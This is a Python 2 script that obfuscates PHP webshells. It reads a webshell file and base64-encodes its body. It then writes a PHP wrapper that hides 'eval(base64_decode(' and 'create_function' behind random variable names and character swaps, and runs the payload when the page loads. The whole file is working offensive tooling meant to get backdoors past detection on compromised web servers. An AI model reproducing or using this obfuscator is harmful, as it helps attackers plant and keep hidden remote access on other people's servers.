#!/usr/bin/python
# -*- coding: utf-8 -*-
import base64, random, string, sys

def get_data(file_path):
	data = open(file_path, 'r').read()
	data = data.split('\n')
	data.remove('')
	data[0] = data[0].replace('<?php', '')
	data[-1] = data[-1].replace('?>', '')
	data = '\n'.join(data)
	data = base64.b64encode(data)
	return data

def rand_char(src_text, rand_text):
	while True:
		gen_src_char = random.choice(src_text)
		gen_dest_char = random.choice(rand_text)
		if gen_src_char != gen_dest_char:# and gen_dest_char not in src_text:
			return gen_src_char, gen_dest_char

def generate(data):
	src_text, src_rand = 'abcdelvs', string.letters
	for tchar in src_rand:
		if tchar in src_text:
			src_rand = src_rand.replace(tchar, '')
	randVar = random.choice(src_rand)
	randVar, src_rand = "${}".format(randVar), src_rand.replace(randVar, '')
	randVar_eFunc = random.choice(src_rand)
	randVar_eFunc, src_rand = "${}".format(randVar_eFunc), src_rand.replace(randVar_eFunc, '')
	exec_func = "eval(base64_decode("
#	exec_func = "base64_decode("
	deObs_eFunc = ''
	for i in range(0, 4):
		src_char, dest_char = rand_char(src_text, src_rand)
		src_text, src_rand = src_text.replace(src_char, ''), src_rand.replace(dest_char, '')
		deObs_eFunc += "{} = str_replace(\"{}\", \"{}\", {});\n".format(randVar_eFunc, dest_char, src_char, randVar_eFunc)
		exec_func = exec_func.replace(src_char, dest_char)
	randVar_crtVar = random.choice(src_rand)
	randVar_crtVar, src_rand = "${}".format(randVar_crtVar), src_rand.replace(randVar_crtVar, '')
	new_data = "{} = \"{}\";\n".format(randVar, data)
	new_data += "{} = \"{}\";\n".format(randVar_eFunc, exec_func)
	new_data += deObs_eFunc
	new_data += "{} = {}.\"\\\"\".{}.\"\\\"\".\"));\";\n".format(randVar_eFunc, randVar_eFunc,randVar)
#	new_data += "{} = {}.\"\\\"\".{}.\"\\\"\".\");\";\n".format(randVar_eFunc, randVar_eFunc,randVar)
	new_data += "{} = str_replace('TG', '', 'creTGateTG_fuTGncTGtiTGon');\n".format(randVar_crtVar)
	new_data += "{} = {}('', {});\n".format(randVar_eFunc, randVar_crtVar, randVar_eFunc)
	new_data += "{}();\n".format(randVar_eFunc)
	new_data = "<?php\n{}?>".format(new_data)
	return new_data

def banner():
	print "{} <path_to_webshell> <output>".format(sys.argv[0])


def main():
	if len(sys.argv) != 3:
		banner()
	else:
		try:
			data = generate(get_data(sys.argv[1]))
#			print data
		except:
			print "Error while reading / generating webshell"
		try:
			new_webshell = open(sys.argv[2], 'w')
			new_webshell.write(data)
			new_webshell.close()
		except:
			print "Error while creating new webshell"

main()
